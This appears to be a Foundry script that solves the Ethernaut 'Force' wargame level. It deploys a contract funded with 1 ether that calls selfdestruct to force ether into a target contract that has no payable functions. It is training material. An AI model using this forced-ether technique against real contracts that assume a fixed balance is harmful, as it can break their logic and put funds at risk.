// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../src/Ethernaut/force.sol";

contract ForceAttackScript is Script {
    Force public force = Force(0xcB9bC38252fD67B5f46849a70a60065b7Dc66e1c);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ForceAttack forceAttack = new ForceAttack{value: 1 ether}();
        forceAttack.attack(address(force));
        console.log("Force contract balance:", address(force).balance);
        vm.stopBroadcast();
    }
}

contract ForceAttack {
    constructor() payable {
        require(msg.value > 0, "Send some ether to deploy");
    }

    function attack(address target) public {
        selfdestruct(payable(target));
    }

    receive() external payable {}
}
